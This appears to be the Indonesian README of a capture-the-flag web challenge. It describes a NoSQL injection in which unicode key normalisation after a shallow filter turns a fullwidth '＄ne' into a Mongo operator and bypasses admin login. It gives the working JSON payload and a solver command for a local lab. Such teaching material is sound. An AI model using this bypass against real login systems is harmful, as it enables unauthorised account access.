# CTF Web Challenge - NoSQL Injection (CVE-Inspired)

Challenge web exploit bertema **NoSQL Injection** dengan filter input yang cukup ketat, tapi masih bisa dibypass.

## Konsep Kerentanan

Aplikasi ini meniru pola kerentanan nyata (CVE-inspired):

- Validasi input hanya dilakukan secara **shallow**.
- Operator Mongo (`$ne`, `$gt`, dll) diblokir jika bentuknya normal.
- Namun ada **normalisasi unicode key** setelah filter.
- Akibatnya key seperti `＄ne` berubah menjadi `$ne` setelah lolos filter.

Ini menghasilkan bypass autentikasi admin melalui operator injection.

## Jalankan Challenge

```bash
docker compose up --build -d
```

Buka:

- http://localhost:8080

## Tujuan Player

1. Bypass login di endpoint `/api/login`.
2. Login sebagai admin.
3. Ambil flag di `/dashboard`.

## Contoh Payload Eksploit

Gunakan di API Login Console:

```json
{
  "username": {
    "＄ne": null
  },
  "password": {
    "＄ne": null
  }
}
```

Jika berhasil, user akan diarahkan ke dashboard admin dan flag muncul.

## Folder Solver

Sudah disediakan di folder `solver/`:

- `solver/WRITEUP.md` → writeup, PoC manual, dan catatan hardening.
- `solver/solve.py` → script solver Python otomatis untuk exploit + fetch flag.

Jalankan solver:

```bash
python3 solver/solve.py --base http://localhost:8080
```

## Catatan untuk Host/Organizer

- Ganti `FLAG` di `docker-compose.yml`.
- Ganti `SESSION_SECRET`.
- Jangan expose log container ke player (karena admin password tercetak untuk host).
